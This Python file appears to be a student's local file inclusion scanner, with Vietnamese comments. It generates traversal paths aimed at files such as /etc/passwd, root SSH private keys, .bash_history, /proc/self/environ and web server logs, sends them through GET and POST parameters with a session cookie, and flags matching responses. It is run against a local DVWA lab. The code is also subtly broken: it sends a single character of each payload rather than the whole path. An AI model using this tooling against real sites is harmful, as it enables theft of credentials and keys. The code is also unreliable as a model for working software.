from a import simple_grammar_fuzzer
from connect import connect
import random
'''
LFI thì làm gì bây giờ nhỉ
với lỗi này thì
xác định request và tham số rồi gửi tới nó đưòng dẫn file mà mình mong muốn
Đầu tiên thì cần xây dựng fuzzer: chịu trách nhiệm tạo ra các đường dẫn file một cách hợp lệ
Chia ra làm 2 loại đường dẫn: Windown và Linux
tham khảo trên payload of the thing nào
phải kết hợp thêm null byte ở cuối nữa mới ổn áp!!!! 
'''

detect_fail_message = {"include: Failed", "Warning: include()", "Failed opening" ,"Failed to open stream:", "File does not exist:"}
detect = {"root:x:x", 
            "open_basedir restriction in effect", "root:", "sbin", "nologin", "DB_NAME", "daemon:", "DOCUMENT_ROOT=",
            "PATH=", "HTTP_USER_AGENT", "HTTP_ACCEPT_ENCODING=" , "users:x", 
            "apache_port=", "cpanel/logs/access", "allow_login_autocomplete", "database_prefix=", "emailusersbandwidth",
            "adminuser=", "error]", "[client", "log", "[error] [client", 

}

#---- for windows
detect_request_method_access_log = {"GET /", "POST /"}
detect_http_version = {"HTTP/1.1", "HTTP/1.0"}
detect_error_log = {"[ssl:warn]", "[mpm_winnt:notice]", "[core:notice]", "[php:warn]"}

#---- for linux
detect_proc_self_status = {"State: R (running)", "Tgid:", "TracerPid:", "Uid:"} #detect for proc/self/status
detect_proc_self_environ = {"/etc/xdgPATH=","XDG_MENU_PREFIX=gnome-LANG", "ORIGINAL_XDG_CURRENT_DESKTOP", "SSH_AUTH_SOCK",
                            "GIO_LAUNCHED_DESKTOP_FILE", "LOGNAME", "DBUS_SESSION_BUS_ADDRESS"
}
detect_etc_passwd = {"root:x:x", "www-data:x:33:33", "/root:/bin/bash"}


class lfi():
    def generator(self, GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR, "@", "@") for i in range(1000)])

    def window_lfi(self):
        widnow = {
                    "@start@" : ["@disk@@directory@%00"],

                    "@disk@" : ["C:\\", "D:\\"],

                    "@directory@" : ["@xampp@",  "@apache@"],

                    "@xampp@" : [ "xampp\@pathxampp@\@filexampp@" ],

                    "@apache@" : [ "apache\@pathapache@\@filexampp@" ],

                    "@pathxampp@" : [ "phpMyAdmin", "apache", "FileZillaFTP", "MercuryMail", "tomcat", "php", "sendmail" , "mysql", "logs"],

                    "@pathapache@" : ["logs"],

                    "@filexampp@" : ["config.inc", "phpinfo.php", "config.inc.php", "error.log","access.log"],

                    "@fileapache@" : ["error.log", "access.log"],
        }

        return self.generator(widnow)

    #---- for linux
    def linux_lfi(self):
        linux = {
                    "@start@" : ["/@folder@"],

                    "@folder@" : ["etc/@directoryEtc@", "opt/@directoryOpt@", "proc/@directoryProc@", "root/@directoryRoot@", "@directoryUsr@", "var/@directoryVar@@endVar@"],


                    "@directoryEtc@" : ["passwd" , "group" , "hosts", "motd" , "issue", "bashrc", "apache2/@fileApache2@" , "httpd/logs/@fileHttpd@"],

                    "@fileApache2@" : ["apache2.conf", "ports.conf" , "sites-available/default"],

                    "@fileHttpd@" : ["access.log", "error.log"],

                    "@directoryOpt@" : ["lampp/logs/@fileHttpd@"],

                    "@directoryProc@" : ["version", "cmdline", "mounts", "config.gz", "self/environ"],

                    "@directoryRoot@" : [".bashrc" , ".bash_history" , ".ssh/@sshFile@"],

                    "@sshFile@" : ["authorized_keys", "id_rsa", "id_rsa.keystore", "id_rsa.pub" , "known_hosts"],

                    "@directoryUsr@" :    ["usr/local/@apache@/htdocs/index.html",
                                        "usr/local/@apache@/htdocs/index.html",
                                        "usr/local/@apache@/conf/extra/httpd-ssl.conf",
                                        "usr/local/@apache@/logs/error_log",
                                        "usr/local/@apache@/logs/access_log",
                                        "usr/local/@apache@/bin/apachectl"],
                    "@apache@" : ["apache", "apache2"],

                    "@directoryVar@" : ["apache/logs/", "log/apache/", "log/httpd/", "log/nginx/"],

                    "@endVar@" : ["access_log", "access.log" , "error_log", "error.log"]
        }
        return self.generator(linux)

    def detect_1(self, url, content, detect_array):
        for i in detect_array:
            if i in content:
                print("LFI : " + url)
                break
            
    # url = http://example.com?file=... 
    # payload = abc.file

    def scan(self,  url, method, params, cookie):
                                      #lfi
        payloads = list(self.linux_lfi())
        x = 0
        for payload in payloads:

            x = x+1
            y = random.randrange(0, len(payloads))
            #url, method, params, payload, cookie
            check = self.scanner(url, method, params, payload[x], cookie)
            if check == 1:
                break
            if x == 5: 
                break


    def scanner(self, url, method, params, payload, cookie):
        status_code = 500
        r =  None
        content = ""
        website = url
        status_code = 200
        conn = connect()# Cần phải truyền thêm parameter vào để phục vụ cho chức năng post

        if method == "GET" or method == "get":              
            r = conn.render_GET(url, params, payload, cookie)
            website = conn.build_url_1(url, None, payload, params)
        if method == "POST" or method == "post": 
            r = conn.normal_POST(url, params, payload, cookie)
            website = conn.build_content(params, payload)
        if r is None:
            return 0
        content = str(r.content)

    

        
        self.detect_1(url, content, detect_fail_message)
            

        if "C:\\" in payload or "D:\\" in payload: # detect window file
            self.detect_1(url, content, detect_error_log)
                
            for i in detect_request_method_access_log:
                for j in detect_http_version:
                    if i in content and j in content:
                        print("LFI : " + url)
                        return 1
        else: # detect linux file
            if "/etc/passwd" in website:
                self.detect_1(url, content, detect_etc_passwd)
                
            if "/proc/self/environ" in website:
                self.detect_1(url, content, detect_proc_self_environ)
        return 0
from crawler import crawler
a = lfi()
cookie = {"PHPSESSID" : "4d941bcfe827b38defd30d665a525a40", "security": "low"}
crawl = crawler("http://localhost/dvwa/", [] ,cookie)
listedCrawl = crawl.run_crawler()

for i in listedCrawl:

    a.scan(i[0],i[1],i[2], cookie )